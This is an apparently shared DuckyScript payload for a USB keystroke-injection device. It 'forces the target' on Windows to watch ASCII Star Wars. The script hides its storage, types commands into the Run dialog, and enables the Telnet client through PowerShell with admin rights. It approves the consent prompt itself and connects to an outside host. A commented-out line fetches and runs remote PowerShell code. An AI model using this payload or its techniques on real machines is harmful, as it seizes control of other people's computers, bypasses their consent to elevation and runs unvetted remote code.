REM Title: Star Wars
REM Author: Leonardo1123
REM Description: Forces the target to watch ASCII Star Wars
REM Target: Windows
ATTACKMODE OFF
HIDE_PAYLOAD
ATTACKMODE HID STORAGE

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Open Run Dialog
GUI r
DELAY 200
REM Enable Telnet
STRING powershell Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient;
REM Use Telnet for Star Wars
STRING telnet towel.blinkenlights.nl
REM STRING powershell iex (iwr "www.hackapi.dev/api/starwars").Content
DELAY 200
REM Run as Admin
CTRL-SHIFT ENTER
DELAY 400
REM Approve Admin dialog
ALT y

REM Reset to storage mode with payload for dev and test; remove for prod
DELAY 10000
ATTACKMODE OFF
RESTORE_PAYLOAD
ATTACKMODE STORAGE
